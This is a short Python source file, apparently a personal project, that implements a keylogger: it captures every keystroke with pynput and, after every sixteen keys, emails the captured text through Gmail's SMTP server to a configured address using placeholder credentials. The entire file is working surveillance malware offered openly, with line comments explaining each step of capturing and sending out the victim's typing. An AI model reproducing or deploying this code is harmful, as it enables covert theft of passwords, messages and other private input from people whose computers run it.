#Welcome to my KeyLogger - made by Varun 
#This code is a Python keylogger that records keystrokes and send them via email 

from pynput.keyboard import Key, Listener      #pynput is used for monitoring and capturing keystokes 
import smtplib, ssl                            #smptlib and ssl are used for sending email 

count = 0   #Count keeps track of numeber of keystrokes
keys = []   #Keys stores the key strokes 

def keyPress(key):            #function is trigered when key is pressed  
    global keys, count
    keys.append(str(key))     #appends the pressed key to keys 
    count += 1                #increments the count by 1
    if count > 15:            #if count>15 resets to 0 
        count = 0
        Mail(keys)           #calls email with list of keys

def Mail(keys):                  #email funtion procceses the key strokes  
    message = ""              
    for key in keys:              #Removes ' and replaces them with key space with space
        k = key.replace("'", "")
        if key == 'Key.space':
            k = ' '
        elif 'Key' in key:
            continue
        message += k              #The keystrokes are stored in the message variable 
    print(message)                #prints the message
    sendMail(message)           #calss send_email with message  

def keyRelease(key):         #if key is released if checks the key released is Edc key or not   
    if key == Key.esc:
        return False

def sendMail(message):                     #this fuction smtp server details and email credentials 
    smtpServer = "smtp.gmail.com"
    port = 587
    sender_emailAdd = "yourmail@gmail.com"
    password = "yourpassword"
    receiver_emailAdd = "yourmail@gmail.com"

    context = ssl.create_default_context()  #creates ssl context for secure comunication 

    try:
        with smtplib.SMTP(smtpServer, port) as server:            #establishes conncection on the smtp server, does neccesry steps for authentication and encryption 
            server.ehlo()                                          #connects with the server, allowing the application yo use it as a email draft  
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_emailAdd, password)
            server.sendmail(sender_emailAdd, receiver_emailAdd, message) #takes the message and sends email using server.sendmail function
        print("*Email Has Been Sent*")
    except Exception as e:                                        #if any exceptions they are printed 
        print(e)

with Listener(on_press=keyPress, on_release=keyRelease) as listener: #recordes when on_press is used 
    listener.join()
